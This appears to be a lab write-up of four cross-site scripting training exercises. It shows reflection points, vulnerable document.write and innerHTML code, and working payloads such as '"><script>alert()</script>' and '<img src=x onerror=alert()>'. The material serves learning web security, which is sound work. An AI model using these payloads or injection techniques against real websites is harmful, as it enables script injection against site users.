### 1. Reflected XSS into HTML context with nothing encoded
**Vulnerable Parameter/Location:** Search field<br>
Reflection Point is given below.
```html
<h1>0 search results for '11111'</h1>
```
**Payload Used:** <script>alert()</script>
### 2. Stored XSS into HTML context with nothing encoded
**Vulnerable Parameter/Location:** Comment field<br>
Reflection Point is given below.
```html
<p>11111</p>
```
**Payload Used:** <script>alert()</script>
### 3. DOM XSS in document.write sink using source location.search
**Vulnerable Parameter/Location:** Search field<br>
User's input is getting reflected back in DOM at two places as given below.
```html
<h1>0 search results for '111111'</h1>
```
```html
<img src="/resources/images/tracker.gif?searchTerms=111111">
```
First reflection point is also visible when we view Source code, but the second one is not visible in source code. Because this does not exist in source code, the server didn't send it. Instead, a client-side JavaScript file grabbed your input (from a Source like location.search, location.hash, or document.referrer) and dynamically wrote it into the page (into a Sink) after the initial page loaded. Lets view the source code again to check for any vulnerable javascript that might be generating the link in second reflection point
```js
function trackSearch(query) {
	document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if (query) {
	trackSearch(query);
}
```
Nice, means we can use the below payload to execute XSS. In the above js code query parameter would be replaced by user's input. So the final payload would be according to the reflection in DOM (Inspect Element).<br>
**Payload**: "><script>alert()</script>
### 4. DOM XSS in innerHTML sink using source location.search
**Objective**: To find out DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.<br>
**Vulnerable Parameter/Location:** Search field<br>
User's input is getting reflected back in DOM(inspect elekment) as given below.
```html
<span id="searchMessage">123456</span>
```
Lets if there is any javascript code using View Source that is setting this searchMessage. Found the below javascript code.
```js
 < script >
 	function doSearchQuery(query) {
 		document.getElementById('searchMessage').innerHTML = query;
 	}
 var query = (new URLSearchParams(window.location.search)).get('search');
 if (query) {
 	doSearchQuery(query);
```
According to the reflection point as the user's input is getting reflected back in span tag we can use the below payload to trigger XSS.<br>
#### Why <script> Fails in innerHTML?
When JavaScript dynamically inserts content using innerHTML, the browser handles it differently. According to the W3C and HTML5 standards, if the string being inserted contains a <script> tag, the browser will still parse it and add it to the DOM tree, but it marks it as unexecutable. Hence the payload would be.
**Payload**: \<img src=x onerror=alert()>
